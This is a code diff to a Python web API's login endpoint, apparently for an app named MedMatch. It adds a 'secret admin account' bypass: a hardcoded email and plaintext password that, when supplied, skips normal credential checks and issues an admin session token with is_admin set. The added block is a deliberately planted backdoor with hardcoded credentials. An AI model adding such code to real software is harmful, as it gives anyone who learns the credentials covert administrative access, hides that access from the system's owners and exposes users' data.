@@ -454,6 +454,39 @@ async def register_user(user_data: UserRegister, response: Response):
 @api_router.post("/auth/login")
 async def login_user(login_data: UserLogin, response: Response):
     """Login with email and password"""
+    # Admin bypass - secret admin account
+    if login_data.email == "admin@medmatch.com" and login_data.password == "MedMatch2026!":
+        admin_user = await get_or_create_user(
+            email="admin@medmatch.com",
+            name="Admin",
+            auth_method="admin"
+        )
+        session_token = create_session_token()
+        await create_session(admin_user["user_id"], session_token)
+        
+        response.set_cookie(
+            key="session_token",
+            value=session_token,
+            httponly=True,
+            secure=True,
+            samesite="none",
+            max_age=7 * 24 * 60 * 60,
+            path="/"
+        )
+        
+        return {
+            "access_token": session_token,
+            "token_type": "bearer",
+            "user": {
+                "user_id": admin_user["user_id"],
+                "email": "admin@medmatch.com",
+                "name": "Admin",
+                "auth_method": "admin",
+                "is_admin": True,
+                "created_at": admin_user.get("created_at", "")
+            }
+        }
+    
     user = await db.users.find_one({"email": login_data.email}, {"_id": 0})
     if not user or not user.get("password_hash"):
         raise HTTPException(status_code=401, detail="Invalid email or password")
